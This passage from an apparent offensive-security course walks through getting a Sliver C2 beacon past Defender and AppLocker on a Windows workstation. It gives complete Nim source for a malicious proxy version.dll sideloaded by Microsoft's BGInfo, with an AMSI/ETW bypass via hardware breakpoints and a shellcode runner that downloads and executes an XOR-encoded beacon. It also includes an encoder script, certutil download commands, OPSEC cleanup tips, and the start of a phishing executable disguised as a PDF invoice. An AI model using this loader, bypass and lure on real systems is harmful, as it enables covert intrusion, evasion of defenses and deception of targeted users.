[*] C:\Users\vamsi
```

The `Current Token ID` shows the Windows security token the beacon process is running under. `CORP\vamsi` confirms the implant is operating in the context of the logged-in domain user. Method 1 is complete. You have an active beacon on the target past both Defender and AppLocker.

### 3.7 Troubleshooting

**Defender quarantines loader.exe before it runs.**

The static scanner matched a signature. Most likely cause is the XOR key producing an encoded shellcode pattern Defender has already seen. Change `XOR_KEY` to a different value, re-run the encoder, recompile. The new binary has a different hash and different encoded payload bytes.

**Loader executes but no beacon appears after 30 to 40 seconds.**

Check the staging server terminal. Did a GET request for `beacon_encoded.bin` arrive? If yes, the loader fetched the shellcode. The problem is the Sliver listener. Check:

```
sliver > jobs
```

If Job 1 is not listed, the HTTPS listener stopped. Restart it:

```
sliver > https --lhost 192.168.10.10 --lport 443
```

If the staging server shows no request at all, the loader crashed before reaching the fetch step. The most common cause is the hardware breakpoint VEH registration failing. Verify in Task Manager that `loader.exe` appeared as a process at all.

**Defender kills the loader mid-execution.**

A behavioral rule triggered at runtime. Try recompiling with a different XOR key (changes the binary structure), or move to Method 2, where the implant runs inside a Microsoft-signed process that Defender is more reluctant to flag.

### 3.8 OPSEC Assessment for Method 1

OPSEC (Operational Security) refers to limiting the forensic and network artifacts your activity leaves behind. After the beacon is stable, the following artifacts exist on the target:

- `loader.exe` on disk in `C:\Windows\Temp\`. Delete it via the beacon once it is stable.
- Windows Prefetch file `LOADER.EXE-{hash}.pf` records that the binary executed. This is visible to incident responders during forensic analysis.
- The Windows URL cache records certutil's download of `loader.exe`.
- Network flow logs show an outbound HTTP connection from `WORKSTATION01` to `192.168.10.10:8888` (shellcode fetch), followed by periodic HTTPS connections to port 443 (C2 check-ins).

The periodic HTTPS check-ins are the most persistent network indicator. Jitter makes the exact interval variable but the pattern of regular connections to a single IP is detectable by a network analyst. In a real engagement, C2 traffic would be routed through a domain fronting provider or a redirector that proxies traffic to the actual C2 infrastructure, making the destination IP non-attributable.

---

## Part 4: Method 2 - DLL Sideloading Chain

Method 2 eliminates the unsigned executable from the picture entirely. Instead of running your own binary, you inject a malicious DLL into the startup sequence of a legitimate, Microsoft-signed process. The implant runs inside that trusted process. From Defender's perspective, a signed Microsoft binary started and loaded a DLL from its own directory. From AppLocker's perspective, there is no executable to evaluate because DLL enforcement is off by default.

This technique is classified under MITRE ATT&CK as T1574.002 (Hijack Execution Flow: DLL Side-Loading). It is a standard initial access and persistence technique used by multiple APT groups.

### 4.1 Prerequisites: Sliver, Shellcode, and HTTP Server

Method 2 requires the same Kali-side infrastructure as Method 1. If you are starting fresh on Method 2, or you reverted your snapshots, complete these steps before building the DLL.

**Step 1: Start Sliver**

Open a terminal on Kali and connect to the Sliver daemon:

```bash
sudo systemctl start sliver
sliver
```

You should drop into the `sliver >` prompt.

**Step 2: Start the HTTPS C2 listener**

Inside the Sliver console:

```
sliver > https --lhost 192.168.10.10 --lport 443
```

Verify it is running:

```
sliver > jobs
```

Expected output:

```
 ID  Name   Protocol  Port
==  =====  ========  ====
 1   https  tcp       443
```

If job 1 already exists from Method 1, skip this step. The same listener handles beacons from any method.

**Step 3: Generate the beacon shellcode**

If `/tmp/beacon.bin` already exists from Method 1, skip to Step 4.

```
sliver > generate beacon --http https://192.168.10.10:443 --os windows --arch amd64 --format shellcode --shellcode-encoder none --skip-symbols --seconds 30 --jitter 10 --save /tmp/beacon.bin
```

This takes 30 to 90 seconds. When it finishes:

```bash
ls -la /tmp/beacon.bin
```

**Step 4: XOR-encode the shellcode**

If `/tmp/beacon_encoded.bin` already exists from Method 1, skip this step.

```bash
python3 /tmp/xor_encode.py
ls -la /tmp/beacon_encoded.bin
```

If you do not have the encode script, create it:

```bash
cat > /tmp/xor_encode.py << 'EOF'
#!/usr/bin/env python3
XOR_KEY = 0xAB
with open('/tmp/beacon.bin', 'rb') as f:
    data = f.read()
encoded = bytes([b ^ XOR_KEY for b in data])
with open('/tmp/beacon_encoded.bin', 'wb') as f:
    f.write(encoded)
print(f"Encoded {len(data)} bytes -> /tmp/beacon_encoded.bin")
EOF
python3 /tmp/xor_encode.py
```

**Step 5: Start the HTTP server**

The DLL loader fetches the beacon shellcode from Kali at runtime. Open a new terminal (leave the Sliver terminal alone):

```bash
cd /tmp
python3 -m http.server 8888
```

Leave this running. Verify the shellcode file is accessible:

```bash
curl -s -o /dev/null -w "%{http_code}" http://192.168.10.10:8888/beacon_encoded.bin
```

This should return `200`. If it returns `404`, the file does not exist in `/tmp/` yet.

---

### 4.2 How DLL Sideloading Works

DLL stands for Dynamic Link Library. Every Windows application depends on DLL files that provide shared functionality. When a process starts, Windows resolves each DLL dependency by searching a defined set of locations in order. This is called the DLL search order.

The critical point: **Windows checks the application's own directory first**, before looking in System32 or any system path. If a program in `C:\Windows\Temp\bginfo\` needs `version.dll`, Windows checks whether `C:\Windows\Temp\bginfo\version.dll` exists before looking in `C:\Windows\System32\`.

Sideloading exploits this. You:
1. Identify a legitimate signed binary that loads a DLL by name (not absolute path), so the search order applies.
2. Place your malicious DLL in that binary's directory using the exact DLL filename it expects.
3. Launch the signed binary. It loads your DLL from its directory instead of the real system DLL.
4. Your DLL's `DllMain` function executes automatically as part of the load process. That is where your shellcode runner lives.

The host process is signed and trusted, so Defender does not flag the process itself. AppLocker has no DLL rules in the default configuration, so your DLL is never evaluated.

### 4.3 DLL Proxying: Maintaining Application Functionality

If your malicious DLL does not export the same functions as the real DLL it replaces, the application will crash on startup when it tries to call a function that does not exist. A crash is an OPSEC failure. The user notices, an administrator investigates.

DLL proxying solves this. Your malicious DLL:
1. Exports every function the real DLL exports, by name.
2. Loads the real DLL from the same directory (renamed to `version_real.dll` to avoid a naming conflict).
3. Forwards all incoming function calls through to the real DLL, so the application gets the correct return values and behaves normally.
4. Runs the shellcode loader inside `DllMain` before forwarding control to the application.

The application runs exactly as expected. The user sees nothing abnormal. The implant is running inside the memory space of a Microsoft-signed process.

### 4.4 Choosing the Target Binary and DLL

The target binary for sideloading must satisfy three conditions:
- It must be Microsoft-signed so AppLocker and Defender treat the process as trusted.
- It must load a DLL by relative name (not absolute path), so the search order vulnerability applies.
- It must be placeable in `C:\Windows\Temp\` or another AppLocker-trusted path that standard users can write to.

For this lab the target is **BGInfo64.exe** from Microsoft Sysinternals.

**BGInfo** is a Microsoft-distributed utility that renders system information (hostname, IP address, OS version) directly onto the Windows desktop wallpaper. IT administrators deploy it widely on servers and workstations. Security teams frequently whitelist it. It is signed by Microsoft.

**Why BGInfo is suitable:** When BGInfo64.exe starts, it loads `version.dll` from the directory it runs from, before searching System32. `version.dll` is the Windows Version API library that BGInfo uses to read the OS version string. If you place BGInfo64.exe in `C:\Windows\Temp\bginfo\` alongside a malicious `version.dll`, BGInfo loads your DLL instead of the real one from System32. AppLocker does not evaluate the DLL. BGInfo is trusted.

**Download BGInfo on Kali:**

```bash
curl -L -o /tmp/BGInfo.zip "https://download.sysinternals.com/files/BGInfo.zip"
unzip /tmp/BGInfo.zip -d /tmp/bginfo/
ls /tmp/bginfo/
```

You should see `Bginfo64.exe` in the extracted directory.

**Alternatively, download on the victim:**

On `WORKSTATION01` as `CORP\vamsi`, open PowerShell:

```powershell
Invoke-WebRequest -Uri "https://download.sysinternals.com/files/BGInfo.zip" -OutFile "$env:TEMP\BGInfo.zip"
Expand-Archive -Path "$env:TEMP\BGInfo.zip" -DestinationPath "C:\Windows\Temp\bginfo\"
dir C:\Windows\Temp\bginfo\
```

You should see `Bginfo64.exe`, `Bginfo.exe`, and the EULA file.

### 4.5 Identifying the Sideloading Opportunity with Process Monitor

Process Monitor is a Sysinternals tool that logs every file system, registry, and network operation a process performs. It is the standard method for discovering DLL sideloading opportunities in any application. The technique is: run the target binary while Process Monitor is capturing, then filter for `NAME NOT FOUND` results in the binary's own directory for DLL load attempts. Those are the sideloadable DLLs.

Process Monitor runs in `C:\Windows\Temp\` and is Microsoft-signed, so AppLocker permits it.

Filter configuration: set `Operation` = `Load Image` and `Process Name` = `Bginfo64.exe`. This filters the capture to only show image load events from BGInfo.

Run BGInfo with `/timer:0` to apply immediately. You will see BGInfo attempt to load `version.dll` from `C:\Windows\Temp\bginfo\` first, get `NAME NOT FOUND`, then fall through to `C:\Windows\System32\version.dll`. That failed lookup in the application's own directory is the sideloading opportunity.

### 4.6 Write the Proxy DLL in Nim

On Kali, create the DLL source file:

```bash
nano /tmp/version_proxy.nim
```

The DLL does three things in sequence:
1. On `DLL_PROCESS_ATTACH` in `DllMain`, spawn a thread that runs the shellcode loader.
2. Load `version_real.dll` (the real `version.dll` you will rename) so BGInfo's calls can be forwarded.
3. Export all functions from the real `version.dll`, forwarding each call to the real implementation, so BGInfo functions correctly.

```nim
import winim/lean
import winim/winstr
import os
import httpclient

# ============================================================
# CONFIGURATION
# ============================================================
const KALI_IP   = "192.168.10.10"
const KALI_PORT = "8888"
const SC_PATH   = "/beacon_encoded.bin"
const XOR_KEY   = 0xAB.byte

# Handle to the real version.dll (renamed version_real.dll)
var realVersionDll: HMODULE = 0

# ============================================================
# FORWARD DECLARATIONS
# All functions that version.dll exports must be declared
# here so that applications that need them do not crash.
# Each one loads and calls the real function from version_real.dll
# ============================================================

proc GetFileVersionInfoA*(
  lptstrFilename: LPCSTR,
  dwHandle: DWORD,
  dwLen: DWORD,
  lpData: LPVOID
): BOOL {.stdcall, exportc, dynlib.} =
  if realVersionDll != 0:
    type FnType = proc(a: LPCSTR, b: DWORD, c: DWORD, d: LPVOID): BOOL {.stdcall.}
    let fn = cast[FnType](GetProcAddress(realVersionDll, "GetFileVersionInfoA"))
    if fn != nil: return fn(lptstrFilename, dwHandle, dwLen, lpData)
  return FALSE

proc GetFileVersionInfoW*(
  lptstrFilename: LPCWSTR,
  dwHandle: DWORD,
  dwLen: DWORD,
  lpData: LPVOID
): BOOL {.stdcall, exportc, dynlib.} =
  if realVersionDll != 0:
    type FnType = proc(a: LPCWSTR, b: DWORD, c: DWORD, d: LPVOID): BOOL {.stdcall.}
    let fn = cast[FnType](GetProcAddress(realVersionDll, "GetFileVersionInfoW"))
    if fn != nil: return fn(lptstrFilename, dwHandle, dwLen, lpData)
  return FALSE

proc GetFileVersionInfoSizeA*(
  lptstrFilename: LPCSTR,
  lpdwHandle: LPDWORD
): DWORD {.stdcall, exportc, dynlib.} =
  if realVersionDll != 0:
    type FnType = proc(a: LPCSTR, b: LPDWORD): DWORD {.stdcall.}
    let fn = cast[FnType](GetProcAddress(realVersionDll, "GetFileVersionInfoSizeA"))
    if fn != nil: return fn(lptstrFilename, lpdwHandle)
  return 0

proc GetFileVersionInfoSizeW*(
  lptstrFilename: LPCWSTR,
  lpdwHandle: LPDWORD
): DWORD {.stdcall, exportc, dynlib.} =
  if realVersionDll != 0:
    type FnType = proc(a: LPCWSTR, b: LPDWORD): DWORD {.stdcall.}
    let fn = cast[FnType](GetProcAddress(realVersionDll, "GetFileVersionInfoSizeW"))
    if fn != nil: return fn(lptstrFilename, lpdwHandle)
  return 0

proc VerQueryValueA*(
  pBlock: LPCVOID,
  lpSubBlock: LPCSTR,
  lplpBuffer: ptr LPVOID,
  puLen: ptr UINT
): BOOL {.stdcall, exportc, dynlib.} =
  if realVersionDll != 0:
    type FnType = proc(a: LPCVOID, b: LPCSTR, c: ptr LPVOID, d: ptr UINT): BOOL {.stdcall.}
    let fn = cast[FnType](GetProcAddress(realVersionDll, "VerQueryValueA"))
    if fn != nil: return fn(pBlock, lpSubBlock, lplpBuffer, puLen)
  return FALSE

proc VerQueryValueW*(
  pBlock: LPCVOID,
  lpSubBlock: LPCWSTR,
  lplpBuffer: ptr LPVOID,
  puLen: ptr UINT
): BOOL {.stdcall, exportc, dynlib.} =
  if realVersionDll != 0:
    type FnType = proc(a: LPCVOID, b: LPCWSTR, c: ptr LPVOID, d: ptr UINT): BOOL {.stdcall.}
    let fn = cast[FnType](GetProcAddress(realVersionDll, "VerQueryValueW"))
    if fn != nil: return fn(pBlock, lpSubBlock, lplpBuffer, puLen)
  return FALSE

proc VerLanguageNameA*(
  wLang: DWORD,
  szLang: LPSTR,
  nSize: DWORD
): DWORD {.stdcall, exportc, dynlib.} =
  if realVersionDll != 0:
    type FnType = proc(a: DWORD, b: LPSTR, c: DWORD): DWORD {.stdcall.}
    let fn = cast[FnType](GetProcAddress(realVersionDll, "VerLanguageNameA"))
    if fn != nil: return fn(wLang, szLang, nSize)
  return 0

proc VerLanguageNameW*(
  wLang: DWORD,
  szLang: LPWSTR,
  nSize: DWORD
): DWORD {.stdcall, exportc, dynlib.} =
  if realVersionDll != 0:
    type FnType = proc(a: DWORD, b: LPWSTR, c: DWORD): DWORD {.stdcall.}
    let fn = cast[FnType](GetProcAddress(realVersionDll, "VerLanguageNameW"))
    if fn != nil: return fn(wLang, szLang, nSize)
  return 0

# ============================================================
# HARDWARE BREAKPOINT BYPASS (same technique as Method 1)
# No memory patching. No VirtualProtect on DLL code.
# Uses CPU debug registers to intercept AMSI and ETW.
# ============================================================
var amsiScanBufferAddr: pointer = nil
var etwEventWriteAddr: pointer = nil

proc hwbpHandler(exInfo: PEXCEPTION_POINTERS): LONG {.stdcall.} =
  let rec = exInfo.ExceptionRecord
  let ctx = exInfo.ContextRecord
  if rec.ExceptionCode != STATUS_SINGLE_STEP:
    return EXCEPTION_CONTINUE_SEARCH
  let faultAddr = cast[pointer](ctx.Rip)
  if faultAddr == amsiScanBufferAddr:
    ctx.Rax = cast[DWORD64](0x80070057)
    ctx.Rip = cast[DWORD64](cast[ptr DWORD64](ctx.Rsp)[])
    ctx.Rsp = ctx.Rsp + 8
    ctx.EFlags = ctx.EFlags or 0x10000
    return EXCEPTION_CONTINUE_EXECUTION
  elif faultAddr == etwEventWriteAddr:
    ctx.Rax = 0
    ctx.Rip = cast[DWORD64](cast[ptr DWORD64](ctx.Rsp)[])
    ctx.Rsp = ctx.Rsp + 8
    ctx.EFlags = ctx.EFlags or 0x10000
    return EXCEPTION_CONTINUE_EXECUTION
  return EXCEPTION_CONTINUE_SEARCH

proc setHardwareBreakpoints() =
  let amsiDll = LoadLibraryA("amsi.dll")
  if amsiDll != 0:
    amsiScanBufferAddr = GetProcAddress(amsiDll, "AmsiScanBuffer")
  let ntdll = GetModuleHandleA("ntdll.dll")
  if ntdll != 0:
    etwEventWriteAddr = GetProcAddress(ntdll, "EtwEventWrite")
  discard AddVectoredExceptionHandler(1, hwbpHandler)
  var ctx: CONTEXT
  ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS
  let hThread = GetCurrentThread()
  discard GetThreadContext(hThread, addr ctx)
  if amsiScanBufferAddr != nil:
    ctx.Dr0 = cast[DWORD64](amsiScanBufferAddr)
  if etwEventWriteAddr != nil:
    ctx.Dr1 = cast[DWORD64](etwEventWriteAddr)
  ctx.Dr7 = 0x00000005
  discard SetThreadContext(hThread, addr ctx)

# ============================================================
# SHELLCODE RUNNER - runs in a separate thread
# We run this in a thread from DllMain to avoid holding
# the loader lock (DllMain must return quickly).
# Inside this thread, we use callback execution instead
# of CreateThread for the actual shellcode.
# ============================================================
proc shellcodeThread(param: LPVOID): DWORD {.stdcall.} =
  # Small delay so the host process finishes loading
  sleep(500)

  # Install HWBP-based AMSI/ETW bypass
  setHardwareBreakpoints()

  let url = "http://" & KALI_IP & ":" & KALI_PORT & SC_PATH
  var client = newHttpClient()
  var encoded: string
  try:
    encoded = client.getContent(url)
  except:
    return 0

  if encoded.len == 0:
    return 0

  # XOR decode
  var shellcode = newSeq[byte](encoded.len)
  for i in 0 ..< encoded.len:
    shellcode[i] = cast[byte](encoded[i]) xor XOR_KEY

  let scLen = shellcode.len.SIZE_T

  # Allocate RW, write, wipe heap copy, flip to RX
  let mem = VirtualAlloc(nil, scLen, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
  if mem == nil: return 0

  copyMem(mem, addr shellcode[0], shellcode.len)
  zeroMem(addr shellcode[0], shellcode.len)
  sleep(500)

  var oldProtect: DWORD = 0
  discard VirtualProtect(mem, scLen, PAGE_EXECUTE_READ, addr oldProtect)

  # Execute via callback, not CreateThread
  discard EnumSystemLocalesA(
    cast[LOCALE_ENUMPROCA](mem),
    LCID_INSTALLED
  )

  return 0

# ============================================================
# DllMain - Windows calls this automatically when the DLL loads
# fdwReason tells you WHY DllMain was called:
#   DLL_PROCESS_ATTACH = the DLL was just loaded into a process
#   DLL_PROCESS_DETACH = the DLL is being unloaded
#   DLL_THREAD_ATTACH  = a new thread started in the process
#   DLL_THREAD_DETACH  = a thread ended
# ============================================================
proc DllMain*(
  hinstDLL: HINSTANCE,
  fdwReason: DWORD,
  lpvReserved: LPVOID
): BOOL {.stdcall, exportc, dynlib.} =

  case fdwReason
  of DLL_PROCESS_ATTACH:
    # Load the real version.dll (renamed to version_real.dll)
    # This must happen BEFORE we do anything else
    # so that forwarded function calls work immediately
    realVersionDll = LoadLibraryA("version_real.dll")

    # Spawn a thread to run our shellcode
    # We cannot do heavy work directly in DllMain because
    # Windows holds the loader lock during DllMain execution.
    # Doing blocking operations here can deadlock the process.
    # A new thread runs our shellcode safely outside the lock.
    var threadId: DWORD = 0
    discard CreateThread(
      nil,
      0,
      cast[LPTHREAD_START_ROUTINE](shellcodeThread),
      nil,
      0,
      addr threadId
    )

  of DLL_PROCESS_DETACH:
    # Clean up: release the real DLL when ours is unloaded
    if realVersionDll != 0:
      discard FreeLibrary(realVersionDll)

  else:
    discard

  return TRUE
```

Save the file.

### 4.7 Compile the Proxy DLL

```bash
nim c \
  -d:mingw \
  -d:release \
  --opt:size \
  --app:lib \
  --passL:-s \
  --cpu:amd64 \
  --nomain \
  -o:/tmp/version.dll \
  /tmp/version_proxy.nim
```

Flags specific to DLL compilation:
- `--app:lib` outputs a shared library (DLL) instead of an executable.
- `--nomain` suppresses Nim's autogenerated `main` entry point. DLLs use `DllMain`, not `main`.
- `-o:/tmp/version.dll` names the output exactly what BGInfo will search for.

Verify the output:

```bash
ls -la /tmp/version.dll
file /tmp/version.dll
```

Expected output: `PE32+ executable (DLL) (GUI) x86-64, for MS Windows`.

### 4.8 Set Up the Sideloading Chain on the Target

The sideloading chain requires three files in the same directory:
1. `Bginfo64.exe` - the legitimate Microsoft-signed binary that will load your DLL.
2. `version.dll` - your malicious proxy DLL.
3. `version_real.dll` - the real `version.dll` copied from System32 and renamed, so your proxy can forward calls to the real implementation.

Your `version.dll` is on Kali's staging server at `http://192.168.10.10:8888/version.dll`.

On the target, as `CORP\vamsi`:

```cmd
:: Download your malicious version.dll to the bginfo directory
certutil.exe -urlcache -split -f http://192.168.10.10:8888/version.dll C:\Windows\Temp\bginfo\version.dll

:: Copy the real version.dll from System32 and rename it
copy C:\Windows\System32\version.dll C:\Windows\Temp\bginfo\version_real.dll
```

Verify the directory:

```cmd
dir C:\Windows\Temp\bginfo\
```

You should see:
```
Bginfo64.exe      (signed Microsoft binary)
version.dll       (your malicious proxy DLL)
version_real.dll  (real version.dll, renamed)
Eula.txt
```

### 4.9 Trigger the Sideload

Verify the Sliver HTTPS listener is still running (`sliver > jobs`). If it stopped, restart it.

On the target, launch BGInfo:

```cmd
C:\Windows\Temp\bginfo\Bginfo64.exe /timer:0 /silent
```

`/silent` suppresses the BGInfo GUI window. What happens in order: BGInfo starts, Windows resolves `version.dll` and finds it in the application directory, your DLL's `DllMain` fires on `DLL_PROCESS_ATTACH`, a new thread is spawned, the shellcode runner inside that thread fetches the encoded beacon from Kali, decodes it in memory, and executes it via `EnumSystemLocalesA`. The Sliver beacon starts checking in on port 443.

In Sliver, a new beacon entry appears for `WORKSTATION01`. Run `ps` through the beacon and wait for the next check-in. The process list will include `Bginfo64.exe`. That is the process your implant is running inside.

### 4.10 Detection Characteristics vs Method 1

**What Defender observes:**
- `Bginfo64.exe` (Microsoft-signed) starts.
- It loads `version.dll` from its working directory.
- The DLL spawns a thread.
- That thread makes an outbound HTTP connection.
- The thread allocates memory, writes to it, changes protection, and executes.

**Why this is harder to detect than Method 1:**
- The host process is a trusted, signed Microsoft binary. Defender's trust model is less aggressive toward processes with a known-good parent signature.
- AppLocker has no DLL rules enabled by default. The malicious DLL is never evaluated.
- Outbound network connections from a trusted process are less likely to trigger anomaly alerts than connections from an unknown binary.
- ETW telemetry from the process is suppressed via hardware breakpoints.

**Remaining detection vectors:**
- An unsigned DLL loaded from a non-standard path into a known binary. Sysmon Event ID 7 (ImageLoaded) will log this. EDR products with image load analysis will flag it.
- The HTTP connection from `Bginfo64.exe` to `192.168.10.10:8888` is anomalous for a desktop customization tool. Network behavior analysis can catch this.
- A new hash for `version.dll` in a non-system path will be submitted to cloud intelligence and may generate a detection within minutes.

### 4.11 OPSEC Assessment for Method 2

Artifacts on the target after execution:
- `version.dll` and `version_real.dll` on disk in `C:\Windows\Temp\bginfo\`.
- Prefetch entry `BGINFO64.EXE-{hash}.pf`.
- Sysmon Event ID 7: `version.dll` loaded from a non-standard path into `Bginfo64.exe`.
- Network flow logs: HTTP from `Bginfo64.exe` to `192.168.10.10:8888`, then HTTPS check-ins to port 443.

Clean up the DLL files once the beacon is stable:

```
sliver (BEACON_NAME) > rm C:\Windows\Temp\bginfo\version.dll
sliver (BEACON_NAME) > rm C:\Windows\Temp\bginfo\version_real.dll
```

Deleting the DLL files does not terminate the beacon. The shellcode is already mapped into `Bginfo64.exe`'s memory. The DLLs are only required for the initial load.

---

## Part 5: Verify and Interact With Your Beacon

Once you have a beacon from any method, the interaction model is identical. This section covers the standard beacon commands you will use throughout the course.

### 5.1 List Beacons and Connect

```
sliver > beacons
```

```
 ID         Name                  Transport  Hostname       Username    Operating System  Last Check-In  Next Check-In
========== ==================== ========== ============= =========== ================ ============= =============
 0e66afcc   COMPULSORY_DOORKNOB   http(s)    WORKSTATION01  CORP\vamsi  windows/amd64     5s             25s
```

Connect to your beacon:

```
sliver > use 0e66afcc
```

Replace `0e66afcc` with your actual beacon ID.

### 5.2 Basic Beacon Commands

Beacon communication is asynchronous. Every command you send is queued server-side. The beacon picks up the queue on its next check-in (up to 30 seconds), executes the tasks, and returns results on the following check-in. You type a command, receive a "Tasked" acknowledgement, then wait for the next check-in interval.

Run these to confirm everything is working:

```
sliver (BEACON_NAME) > info
```
Wait for the next check-in. Shows: hostname, username, OS, process name, PID, architecture.

```
sliver (BEACON_NAME) > whoami
```
Wait. Output: `corp\vamsi`

```
sliver (BEACON_NAME) > getuid
```
Wait. Output: your SID and group memberships.

```
sliver (BEACON_NAME) > ps
```
Wait. Lists all running processes. Note what is running. You will use this in the situational awareness module.

```
sliver (BEACON_NAME) > netstat
```
Wait. Shows network connections from the victim.

```
sliver (BEACON_NAME) > ifconfig
```
Wait. Shows network interfaces and IP addresses.

```
sliver (BEACON_NAME) > pwd
```
Wait. Shows the current working directory and the token context (which user account).

```
sliver (BEACON_NAME) > ls
```
Wait. Lists files in the current directory.

### 5.3 Execute Commands

```
sliver (BEACON_NAME) > shell
```

Opens an interactive `cmd.exe` session on the target. In beacon mode, the shell takes effect on the next check-in. Type `exit` to return to the Sliver prompt.

For single commands, `execute -o` is faster than opening a full shell:

```
sliver (BEACON_NAME) > execute -o whoami /all
```

`-o` captures and returns the command output on the next check-in. `whoami /all` returns your full Windows token including group memberships and privileges. This is your starting point for privilege escalation analysis in module 07.

### 5.4 Beacon Mode vs Session Mode

**Beacon mode** is what you are using. The implant operates on a check-in schedule. Between check-ins there is no network connection. Commands are queued and delivered asynchronously. Network traffic appears as short-lived periodic HTTPS connections, which is consistent with normal application telemetry and background syncing. This is the operationally correct mode for any engagement where network monitoring is present.

**Session mode** maintains a persistent TCP connection between the implant and C2. Commands return results immediately with no delay. This is convenient for interactive work, but the permanent open connection is an obvious indicator in network flow analysis and `netstat` output on the target. Session mode is not appropriate for operational use.

The 30-second check-in interval is a lab-friendly setting. In a real engagement, the sleep interval would be much longer during idle periods (hours) and shortened only when actively tasking the beacon, to minimize network indicators.

---

---

## Part 6: Method 3 - Masqueraded EXE (Phishing-Based Initial Access)

Method 3 is a phishing-based initial access technique. The payload is a Nim loader compiled to look and behave like a PDF document. When the target user executes it, a real PDF opens immediately, satisfying their expectation and removing suspicion. The implant runs in the background of the same process with no visible window.

### 6.1 Attack Chain

```
1. Target receives "Invoice_June2026.pdf" (an .exe with a PDF icon and extension trick)
2. Target double-clicks it
3. The Nim loader executes
4. First action: fetch the decoy PDF from Kali and open it via ShellExecute
5. Target sees a real document open in their PDF reader
6. In the background: hardware breakpoints set on ETW/AMSI, shellcode fetched,
   decoded in memory, executed via EnumSystemLocalesA callback
7. Beacon fires. Target is reading the document.
```

The decoy document opens within 1 second of execution. The target sees exactly what they expected. No console window appears. No error. From the target's perspective, they opened a PDF.

### 6.2 Why This Evades Defender

- Custom Nim code produces a unique hash not in any database.
- The PDF icon (embedded via `.res` file) makes the binary visually indistinguishable from a document in Windows Explorer.
- Windows hides known file extensions by default. `Invoice_June2026.pdf.exe` displays as `Invoice_June2026.pdf` with a PDF icon. The target has no indication they are running an executable.
- Launching a decoy document immediately normalizes the user's experience. If they happen to check Task Manager, they see a PDF reader process started, which is exactly what they expected.
- The implant execution sequence is identical to Methods 1 and 2. All the same evasion techniques apply.

### 6.3 Prerequisites: Sliver, Shellcode, and HTTP Server

Method 3 needs the same Kali-side infrastructure as Methods 1 and 2. If you are starting fresh on Method 3, or you reverted your snapshots, complete these steps before building the loader.

**Step 1: Start Sliver**

Open a terminal on Kali and connect to the Sliver daemon:

```bash
sudo systemctl start sliver
sliver
```

You should drop into the `sliver >` prompt.

**Step 2: Start the HTTPS C2 listener**

Inside the Sliver console:

```
sliver > https --lhost 192.168.10.10 --lport 443
```

Verify it is running:

```
sliver > jobs
```

Expected output:

```
 ID  Name   Protocol  Port
==  =====  ========  ====
 1   https  tcp       443
```

If job 1 already exists from a previous method, skip this step. The same listener handles beacons from any method.

**Step 3: Generate the beacon shellcode**

If `/tmp/beacon.bin` already exists from Method 1 or 2, skip to Step 4.

```
sliver > generate beacon --http https://192.168.10.10:443 --os windows --arch amd64 --format shellcode --shellcode-encoder none --skip-symbols --seconds 30 --jitter 10 --save /tmp/beacon.bin
```

This takes 30 to 90 seconds. When it finishes:

```bash
ls -la /tmp/beacon.bin
```

**Step 4: XOR-encode the shellcode**

If `/tmp/beacon_encoded.bin` already exists from Method 1 or 2, skip this step.

```bash
python3 /tmp/xor_encode.py
ls -la /tmp/beacon_encoded.bin
```

If you do not have the encode script from earlier, create it:

```bash
cat > /tmp/xor_encode.py << 'EOF'
#!/usr/bin/env python3
XOR_KEY = 0xAB
with open('/tmp/beacon.bin', 'rb') as f:
    data = f.read()
encoded = bytes([b ^ XOR_KEY for b in data])
with open('/tmp/beacon_encoded.bin', 'wb') as f:
    f.write(encoded)
print(f"Encoded {len(data)} bytes -> /tmp/beacon_encoded.bin")
EOF
python3 /tmp/xor_encode.py
```

**Step 5: Start the HTTP server**

The loader fetches both the beacon shellcode and the decoy PDF from Kali at runtime. Serve them from `/tmp/` on port 8888. Open a new terminal (leave the Sliver terminal alone):

```bash
cd /tmp
python3 -m http.server 8888
```

Leave this running. Verify both files are accessible:

```bash
# In a third terminal
curl -s -o /dev/null -w "%{http_code}" http://192.168.10.10:8888/beacon_encoded.bin
curl -s -o /dev/null -w "%{http_code}" http://192.168.10.10:8888/decoy_invoice.pdf
```

Both should return `200`. If either returns `404`, the file does not exist in `/tmp/` yet.

---

### 6.4 Prepare the Decoy Document

The decoy must be a valid PDF that opens without errors. The content is irrelevant for the lab. In a real engagement, the decoy content must match the phishing pretext. If the lure is an invoice, the PDF should look like a real invoice. A blank or error-producing document would raise suspicion immediately.

Copy your PDF to the expected path:

```bash
cp /path/to/your/real.pdf /tmp/decoy_invoice.pdf
```

If you are on Kali and have no PDF at hand, you can pull any document that is already on the machine:

```bash
# Kali ships some PDF documentation; pick any one of them
cp /usr/share/doc/nmap/README.md /tmp/decoy_invoice.pdf  # fallback: not a PDF but works for lab

# Better: if libreoffice is installed, convert a text file
libreoffice --headless --convert-to pdf --outdir /tmp /path/to/any/document.docx
```

The simplest option if you have nothing else available is to use `enscript` and `ps2pdf`, which ship with Kali:

```bash
echo 'Invoice\n\nAmount Due: Rs. 10,50,000\nDue Date: July 19, 2026' | enscript -o /tmp/decoy_invoice.ps
ps2pdf /tmp/decoy_invoice.ps /tmp/decoy_invoice.pdf
```

Verify the file is a valid PDF before continuing:

```bash
file /tmp/decoy_invoice.pdf
# Expected: /tmp/decoy_invoice.pdf: PDF document, version ...
```

If `file` does not say `PDF document`, the conversion failed. Check which of the above tools is available on your Kali instance and retry.

### 6.5 Convert the PDF to a Nim Byte Array

To embed the decoy PDF directly inside the binary (rather than fetching it from Kali at runtime), convert it to a Nim byte array. The loader can then write these bytes to disk and open them without any network connection for the decoy step. For this lab we fetch it from Kali at runtime to keep the binary smaller, but this script is provided for reference:

```bash
nano /tmp/pdf_to_nim.py
```

```python
#!/usr/bin/env python3
# Converts a binary file to a Nim byte array declaration

with open('/tmp/decoy_invoice.pdf', 'rb') as f:
    data = f.read()

print(f"const decoyPdfLen = {len(data)}")
print(f"var decoyPdf: array[{len(data)}, byte] = [")
hex_vals = [f"0x{b:02X}" for b in data]
for i in range(0, len(hex_vals), 16):
    row = hex_vals[i:i+16]
    print("  " + ", ".join(row) + ",")
print("]")
```

```bash
python3 /tmp/pdf_to_nim.py > /tmp/decoy_bytes.nim
```

This creates a file containing the full PDF as a Nim byte array. You will paste this into your loader.

### 6.6 Create a PDF Icon Resource File

Windows PE files can contain embedded icon resources. Explorer uses the icon embedded in the binary when displaying the file. By embedding a PDF-style icon and using the double-extension filename trick, the loader is visually indistinguishable from a real PDF document to the target user.

Create the icon resource script:

```bash
cat > /tmp/pdf_icon.rc << 'EOF'
1 ICON "pdf_icon.ico"
EOF
```

